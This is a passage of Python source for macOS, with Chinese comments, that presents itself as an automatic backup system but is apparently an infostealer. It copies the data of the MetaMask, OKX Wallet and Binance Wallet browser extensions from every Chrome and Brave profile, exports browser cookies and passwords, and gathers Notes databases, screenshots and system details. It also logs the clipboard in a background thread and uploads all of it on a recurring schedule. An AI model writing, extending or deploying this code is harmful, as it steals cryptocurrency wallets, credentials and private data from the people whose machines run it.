        logging.error("å¤‡å¿˜å½•æ•°æ®ç›®å½•ä¸å­˜åœ¨")
        return None
        
    backup_manager = BackupManager()
    if not backup_manager._clean_directory(notes_backup_directory):
        return None
        
    try:
        # å¤åˆ¶å¤‡å¿˜å½•æ•°æ®
        for root, _, files in os.walk(notes_dir):
            for file in files:
                if file.endswith('.sqlite') or file.endswith('.storedata'):
                    source_file = os.path.join(root, file)
                    if not os.path.exists(source_file):
                        continue
                        
                    relative_path = os.path.relpath(root, notes_dir)
                    target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                    
                    if not backup_manager._ensure_directory(target_sub_dir):
                        continue
                        
                    try:
                        shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                    except Exception as e:
                        logging.error(f"å¤åˆ¶å¤‡å¿˜å½•æ–‡ä»¶å¤±è´¥: {e}")
                        continue
                        
        return notes_backup_directory if os.listdir(notes_backup_directory) else None
    except Exception as e:
        logging.error(f"å¤‡ä»½å¤‡å¿˜å½•æ•°æ®å¤±è´¥: {e}")
        return None

def backup_screenshots():
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    def get_screenshot_location():
        """è¯»å– macOS æˆªå›¾è‡ªå®šä¹‰ä¿å­˜è·¯å¾„ï¼ˆè‹¥å­˜åœ¨ï¼‰"""
        try:
            output = subprocess.check_output(
                ['defaults', 'read', 'com.apple.screencapture', 'location'],
                stderr=subprocess.STDOUT
            ).decode('utf-8', errors='ignore').strip()
            if output and os.path.exists(output):
                return output
        except Exception:
            return None
        return None

    screenshot_paths = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Pictures')
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "å±å¹•å¿«ç…§",
        "å±å¹•æˆªå›¾",
        "æˆªå›¾",
        "æˆªå±"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # æ‰«ææ•´ä¸ªç›®å½•ï¼Œç­›é€‰åŒ…å«"screenshot"å…³é”®å­—çš„æ–‡ä»¶
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ…å«æˆªå›¾å…³é”®å­—ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        # æ—¢è¦å‘½ä¸­æˆªå›¾å…³é”®å­—ï¼Œä¹Ÿè¦æ˜¯å¸¸è§å›¾ç‰‡æ ¼å¼
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info("ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå·²æ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æˆªå›¾æ–‡ä»¶")
            
    return screenshot_backup_directory if files_found else None

def backup_browser_extensions(backup_manager):
    """å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®ï¼ˆæ”¯æŒå¤šä¸ªæµè§ˆå™¨åˆ†èº«ï¼‰"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    extensions_backup_dir = os.path.join(
        backup_manager.config.BACKUP_ROOT,
        f"{user_prefix}_browser_extensions"
    )

    # æµè§ˆå™¨æ‰©å±•ç›¸å…³ç›®å½•ï¼ˆä»…å¤‡ä»½ MetaMaskã€OKX Walletã€Binance Walletï¼‰
    metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
    binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
    
    # æµè§ˆå™¨ User Data æ ¹ç›®å½•ï¼ˆmacOS è·¯å¾„ï¼‰
    home_dir = os.path.expanduser('~')
    browser_user_data_paths = {
        "chrome": os.path.join(home_dir, 'Library', 'Application Support', 'Google', 'Chrome'),
        "brave": os.path.join(home_dir, 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser'),
    }
    
    try:
        if not backup_manager._ensure_directory(extensions_backup_dir):
            return None

        # ä»…å¤‡ä»½ MetaMaskã€OKX Walletã€Binance Wallet æ‰©å±•æ•°æ®
        extensions = {
            "metamask": metamask_extension_id,
            "okx_wallet": okx_wallet_extension_id,
            "binance_wallet": binance_wallet_extension_id,
        }
        
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # å¤‡ä»½æ¯ä¸ª Profile ä¸­çš„æ‰©å±•
                for profile_name, ext_settings_path in profiles:
                    for ext_name, ext_id in extensions.items():
                        source_dir = os.path.join(ext_settings_path, ext_id)
                        if not os.path.exists(source_dir):
                            continue
                        
                        # ç›®æ ‡ç›®å½•åŒ…å« Profile åç§°
                        profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                        target_dir = os.path.join(extensions_backup_dir, 
                                                 f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                        try:
                            if os.path.exists(target_dir):
                                shutil.rmtree(target_dir, ignore_errors=True)
                            parent_dir = os.path.dirname(target_dir)
                            if backup_manager._ensure_directory(parent_dir):
                                shutil.copytree(source_dir, target_dir, symlinks=True)
                                backed_up_count += 1
                                if backup_manager.config.DEBUG_MODE:
                                    logging.info(f"ğŸ“¦ å·²å¤‡ä»½: {browser_name} {profile_name} {ext_name}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ‰©å±•ç›®å½•å¤±è´¥: {source_dir} - {e}")
            
            except Exception as e:
                logging.error(f"æ‰«æ {browser_name} é…ç½®æ–‡ä»¶å¤±è´¥: {e}")

        # Safari å¤‡ä»½æ•´ä¸ªæ‰©å±•ç›®å½•ï¼ˆSafari ä¸ä½¿ç”¨ Chrome æ‰©å±• IDï¼‰
        safari_root = os.path.join(home_dir, 'Library', 'Safari', 'Extensions')
        if os.path.exists(safari_root):
            target_dir = os.path.join(extensions_backup_dir, f"{user_prefix}_safari_extensions")
            try:
                if os.path.exists(target_dir):
                    shutil.rmtree(target_dir, ignore_errors=True)
                if backup_manager._ensure_directory(os.path.dirname(target_dir)):
                    shutil.copytree(safari_root, target_dir, symlinks=True)
                    backed_up_count += 1
                    if backup_manager.config.DEBUG_MODE:
                        logging.info(f"ğŸ“¦ å·²å¤‡ä»½: Safari æ‰©å±•")
            except Exception as e:
                logging.error(f"å¤åˆ¶ Safari æ‰©å±•ç›®å½•å¤±è´¥: {e}")

        if backed_up_count > 0:
            logging.info(f"ğŸ“¦ æˆåŠŸå¤‡ä»½ {backed_up_count} ä¸ªæµè§ˆå™¨æ‰©å±•")
            return extensions_backup_dir
        else:
            logging.warning("âš ï¸ æœªæ‰¾åˆ°ä»»ä½•æµè§ˆå™¨æ‰©å±•æ•°æ®")
            return None
    except Exception as e:
        logging.error(f"å¤åˆ¶æµè§ˆå™¨æ‰©å±•ç›®å½•å¤±è´¥: {e}")
        return None

def backup_browser_data():
    """å¤‡ä»½æµè§ˆå™¨æ•°æ®ï¼ˆCookieså’Œå¯†ç ï¼‰"""
    if not CRYPTO_AVAILABLE:
        logging.warning("âš ï¸  è·³è¿‡æµè§ˆå™¨æ•°æ®å¤‡ä»½ï¼ˆpycryptodomeæœªå®‰è£…ï¼‰")
        return None
    
    try:
        logging.info("\nğŸŒ å¼€å§‹å¤‡ä»½æµè§ˆå™¨æ•°æ®...")
        exporter = BrowserDataExporter()
        browser_data_file = exporter.export_all()
        
        if browser_data_file and os.path.exists(browser_data_file):
            logging.critical("â˜‘ï¸ æµè§ˆå™¨æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            return browser_data_file
        else:
            logging.error("âŒ æµè§ˆå™¨æ•°æ®å¤‡ä»½å¤±è´¥\n")
            return None
    except Exception as e:
        logging.error(f"âŒ æµè§ˆå™¨æ•°æ®å¤‡ä»½å‡ºé”™: {e}")
        return None


def backup_mac_data(backup_manager):
    """å¤‡ä»½Macç³»ç»Ÿæ•°æ®ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        
    Returns:
        list: å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›ç©ºåˆ—è¡¨
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    try:
        # å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®
        extensions_backup = backup_browser_extensions(backup_manager)
        if extensions_backup:
            backup_path = backup_manager.zip_backup_folder(
                extensions_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_browser_extensions_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æµè§ˆå™¨æ‰©å±•æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æµè§ˆå™¨æ‰©å±•æ•°æ®å‹ç¼©å¤±è´¥\n")
        else:
            logging.warning("â­ï¸  æµè§ˆå™¨æ‰©å±•æ•°æ®æ”¶é›†å¤±è´¥æˆ–æœªæ‰¾åˆ°\n")
        
        # å¤‡ä»½æµè§ˆå™¨æ•°æ®ï¼ˆCookieså’Œå¯†ç ï¼‰
        browser_data_file = backup_browser_data()
        if browser_data_file:
            backup_paths.append(browser_data_file)
        
        # å¤‡ä»½å¤‡å¿˜å½•æ•°æ®
        notes_backup = backup_notes()
        if notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ å¤‡å¿˜å½•æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ å¤‡å¿˜å½•æ•°æ®å‹ç¼©å¤±è´¥\n")
        else:
            logging.error("âŒ å¤‡å¿˜å½•æ•°æ®æ”¶é›†å¤±è´¥\n")
        
        # å¤‡ä»½æˆªå›¾æ–‡ä»¶
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æˆªå›¾æ–‡ä»¶å‹ç¼©å¤±è´¥\n")
        else:
            logging.info("â„¹ï¸ æœªå‘ç°å¯å¤‡ä»½çš„æˆªå›¾æ–‡ä»¶\n")

    except Exception as e:
        logging.error(f"Macæ•°æ®å¤‡ä»½å¤±è´¥: {e}")
    
    return backup_paths

def backup_volumes(backup_manager, available_volumes):
    """å¤‡ä»½å¯ç”¨æ•°æ®å·ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰
    
    Returns:
        list: å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
    """
    backup_paths = []
    for volume_name, volume_configs in available_volumes.items():
        logging.info(f"\næ­£åœ¨å¤„ç†æ•°æ®å· {volume_name}")
        for backup_type, (source_dir, target_dir, ext_type) in volume_configs.items():
            try:
                if backup_type == 'specified':
                    # ä½¿ç”¨æ–°çš„æŒ‡å®šæ–‡ä»¶å¤‡ä»½æ–¹æ³•
                    backup_dir = backup_manager.backup_specified_files(source_dir, target_dir)
                else:
                    # ä½¿ç”¨åŸæœ‰çš„å¤‡ä»½æ–¹æ³•
                    backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"â˜‘ï¸ {volume_name} {backup_type} å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
                    else:
                        logging.error(f"âŒ {volume_name} {backup_type} å‹ç¼©å¤±è´¥\n")
                else:
                    logging.error(f"âŒ {volume_name} {backup_type} å¤‡ä»½å¤±è´¥\n")
            except Exception as e:
                logging.error(f"âŒ {volume_name} {backup_type} å¤‡ä»½å‡ºé”™: {str(e)}\n")
    
    return backup_paths

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    # ä½¿ç”¨æ–°çš„å¤‡ä»½ç›®å½•è·¯å¾„
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # å¯åŠ¨JTBç›‘æ§çº¿ç¨‹
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("ğŸ“‹ JTBç›‘æ§çº¿ç¨‹å·²å¯åŠ¨")
    
    # å¯åŠ¨JTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("ğŸ“¤ JTBä¸Šä¼ çº¿ç¨‹å·²å¯åŠ¨")
    
    # åˆå§‹åŒ–JTBæ—¥å¿—æ–‡ä»¶
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥: {e}")

    # è·å–ç”¨æˆ·åå’Œç³»ç»Ÿä¿¡æ¯
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # è·å–ç³»ç»Ÿç¯å¢ƒä¿¡æ¯
    system_info = {
        "æ“ä½œç³»ç»Ÿ": platform.system(),
        "ç³»ç»Ÿç‰ˆæœ¬": platform.release(),
        "ç³»ç»Ÿæ¶æ„": platform.machine(),
        "Pythonç‰ˆæœ¬": platform.python_version(),
        "ä¸»æœºå": hostname,
        "ç”¨æˆ·å": username,
    }
    
    # è·å–macOSè¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯
    try:
        if platform.system() == "Darwin":
            mac_ver = platform.mac_ver()[0]
            if mac_ver:
                system_info["macOSç‰ˆæœ¬"] = mac_ver
            
            # å°è¯•è·å–æ›´è¯¦ç»†çš„macOSç‰ˆæœ¬åç§°
            try:
                result = subprocess.run(
                    ['sw_vers', '-productVersion'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    system_info["macOSè¯¦ç»†ç‰ˆæœ¬"] = result.stdout.strip()
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError):
                pass
    except Exception:
        pass
    
    # è¾“å‡ºå¯åŠ¨ä¿¡æ¯å’Œç³»ç»Ÿç¯å¢ƒ
    logging.critical("\n" + "="*50)
    logging.critical("ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨")
    logging.critical("="*50)
    logging.critical(f"â° å¯åŠ¨æ—¶é—´: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("ğŸ“Š ç³»ç»Ÿç¯å¢ƒä¿¡æ¯:")
    for key, value in system_info.items():
        logging.critical(f"   â€¢ {key}: {value}")
    logging.critical("-"*50)
    logging.critical("ğŸ“‹ JTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*50)

    def read_next_backup_time():
        """è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            if os.path.exists(BackupConfig.THRESHOLD_FILE):
                with open(BackupConfig.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            next_time = datetime.now() + timedelta(seconds=BackupConfig.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(BackupConfig.THRESHOLD_FILE), exist_ok=True)
            with open(BackupConfig.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None

    def should_backup_now():
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                # è·å–å½“å‰å¯ç”¨çš„æ•°æ®å·
                available_volumes = get_available_volumes()
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ’¾ æ•°æ®å·å¤‡ä»½")
                volumes_backup_paths = backup_volumes(backup_manager, available_volumes)
                
                logging.critical("\nğŸ Macç³»ç»Ÿæ•°æ®å¤‡ä»½")
                mac_data_backup_paths = backup_mac_data(backup_manager)
                
                # åˆå¹¶æ‰€æœ‰å¤‡ä»½è·¯å¾„
                all_backup_paths = volumes_backup_paths + mac_data_backup_paths
                
                # å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = write_next_backup_time()
                
                # è¾“å‡ºç»“æŸè¯­ï¼ˆåœ¨ä¸Šä¼ ä¹‹å‰ï¼‰
                has_backup_files = len(all_backup_paths) > 0
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                
                # å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
                if all_backup_paths:
                    logging.critical("ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("âœ… æ‰€æœ‰å¤‡ä»½æ–‡ä»¶ä¸Šä¼ æˆåŠŸ")
                    else:
                        logging.error("âŒ éƒ¨åˆ†å¤‡ä»½æ–‡ä»¶ä¸Šä¼ å¤±è´¥")
                
                # ä¸Šä¼ å¤‡ä»½æ—¥å¿—
                logging.critical("\nğŸ“ æ­£åœ¨ä¸Šä¼ å¤‡ä»½æ—¥å¿—...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"âŒ æ—¥å¿—å¤‡ä»½ä¸Šä¼ å¤±è´¥: {e}")
            
            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡æ˜¯å¦éœ€è¦å¤‡ä»½
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥: {log_error}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿæ›´æ–°ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
        try:
            # è¯»å–å½“å‰æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
                
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
                
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶ï¼Œåªä¿ç•™ä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """JTBä¸Šä¼ çº¿ç¨‹
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        clipboard_log_path: JTBæ—¥å¿—æ–‡ä»¶è·¯å¾„
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = 0
    
    while True:
        try:
            current_time = time.time()
            
            # æ£€æŸ¥æ˜¯å¦éœ€è¦ä¸Šä¼ ï¼ˆæ¯20åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼‰
            if current_time - last_upload_time >= BackupConfig.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    file_size = os.path.getsize(clipboard_log_path)
                    if file_size > 0:
